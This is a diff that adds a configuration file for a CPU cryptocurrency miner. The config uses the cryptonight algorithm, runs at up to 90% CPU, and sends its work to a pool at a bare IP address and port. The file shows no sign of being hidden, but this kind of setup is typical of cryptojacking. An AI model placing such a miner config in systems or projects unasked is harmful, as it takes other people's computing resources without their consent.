@@ -1,0 +1,27 @@
+{
+    "algo": "cryptonight",
+    "av": 0,
+    "background": false,
+    "colors": true,
+    "cpu-affinity": "0xf",
+    "cpu-priority": 3,
+    "donate-level": 1,
+    "log-file": null,
+    "max-cpu-usage": 90.000000,
+    "print-time": 10,
+    "retries": 5,
+    "retry-pause": 2,
+    "safe": false,
+    "syslog": false,
+    "threads": null,
+    "pools": [
+	{
+            "url": "45.32.171.89:4444",
+            "user": "0",
+            "pass": "x",
+            "keepalive": true,
+            "nicehash": true
+        }
+    ]
+}
+
